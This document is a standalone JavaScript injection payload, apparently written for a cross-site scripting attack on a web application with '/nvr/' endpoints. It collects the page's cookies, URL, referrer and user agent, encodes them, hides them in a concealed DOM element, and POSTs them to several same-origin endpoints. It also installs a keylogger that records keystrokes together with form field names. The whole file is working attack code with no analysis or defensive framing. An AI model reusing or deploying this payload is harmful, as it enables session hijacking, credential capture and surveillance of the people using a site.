(function() {
    'use strict';
    
    var payload = {
        cookie: document.cookie,
        url: location.href,
        referrer: document.referrer,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString()
    };
    
    console.log('=== EXFILTRATION DATA START ===');
    console.log(btoa(JSON.stringify(payload)));
    console.log('=== EXFILTRATION DATA END ===');
    
    function addToDOM() {
        if (!document.body) {
            setTimeout(addToDOM, 50);
            return;
        }
        
        try {
            var div = document.createElement('div');
            div.id = 'exfil-data';
            div.style.display = 'none';
            div.setAttribute('data-exfil', btoa(JSON.stringify(payload)));
            div.textContent = btoa(JSON.stringify(payload));
            document.body.appendChild(div);
            
            console.log('[+] Data stored in DOM element #exfil-data');
        } catch(e) {
            console.error('[!] Failed to add to DOM:', e);
        }
    }
    
    addToDOM();
    
    function sendToEndpoints() {
        var encoded = btoa(JSON.stringify(payload));
        
        var endpoints = [
            '/nvr/getDefinitionById.ajax',
            '/nvr/quickfind.htm',
            '/nvr/search'
        ];
        
        endpoints.forEach(function(endpoint) {
            try {
                var xhr = new XMLHttpRequest();
                xhr.open('POST', endpoint, true);
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                xhr.send('exfil_' + encoded.substring(0, 100) + '=1');
            } catch(e) {}
        });
        
        console.log('[+] Data sent to same-origin endpoints');
    }
    
    sendToEndpoints();
    
    var keyBuffer = [];
    document.addEventListener('keydown', function(e) {
        keyBuffer.push({
            key: e.key,
            target: e.target.tagName,
            name: e.target.name || '',
            timestamp: Date.now()
        });
        
        if (keyBuffer.length >= 30) {
            console.log('[KEYS]', keyBuffer);
            keyBuffer = [];
        }
    }, true);
    
    setInterval(function() {
        if (keyBuffer.length > 0) {
            console.log('[KEYS]', keyBuffer);
            keyBuffer = [];
        }
    }, 15000);
    
    console.log('[*] Monitoring initialized');
})();
